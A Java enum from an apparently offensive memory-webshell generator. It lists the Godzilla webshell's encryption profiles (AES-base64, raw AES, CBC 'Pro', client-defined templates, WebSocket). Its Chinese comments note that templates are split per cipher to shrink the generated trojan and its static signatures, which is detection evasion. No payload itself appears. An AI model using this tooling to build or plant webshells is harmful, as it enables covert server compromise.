package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

/**
 * 哥斯拉 Java 侧的加密器（profile）。
 * <p>
 * 每个取值对应一组独立的模板文件：模板类名 = 基础模板名 + {@link #getSuffix()}。
 * 这样生成的马只带当前加密器需要的协议代码，不会把四种协议的逻辑都塞进同一个类，
 * 体积与静态特征都更小。
 *
 * @author ReaJason
 */
public enum GodzillaHwCryption {
    /**
     * pass=base64(AES(payload))，回包 md5 包裹。哥斯拉默认加密器。
     */
    JAVA_AES_BASE64(""),
    /**
     * 请求/响应都是裸 AES 字节，Content-Type: application/octet-stream。
     */
    JAVA_AES_RAW("Raw"),
    /**
     * 请求/响应都是 base64(AES)，回包用 md5(key) 包裹。
     */
    JAVA_AES_RAW_BASE64("RawBase64"),
    /**
     * AES/CBC + IV=md5(pass)[0:16]，AuthType=apiLogin&loginCa=...，回包 {"msg":"..."}。
     */
    JAVA_AES_BASE64_PRO("Pro"),
    /**
     * 自定义 profile：请求/响应模板由客户端在运行时下发，服务端按 md5(key+pass) 标记
     * 从请求体中截取数据、把结果填回客户端下发的响应模板。
     */
    JAVA_AES_BASE64_PROFILE("Profile"),
    /**
     * WebSocket / RawWebSocket 专用：裸 AES 二进制帧，无 HTTP 表单/marker，只有 key。
     * 模板不按加密器拆后缀，直接命中 {@code GodzillaHwWebSocket} / {@code GodzillaHwRawWebSocket}。
     */
    JAVA_WEB_SOCKET_AES_RAW("");

    private final String suffix;

    GodzillaHwCryption(String suffix) {
        this.suffix = suffix;
    }

    public String getSuffix() {
        return suffix;
    }
}
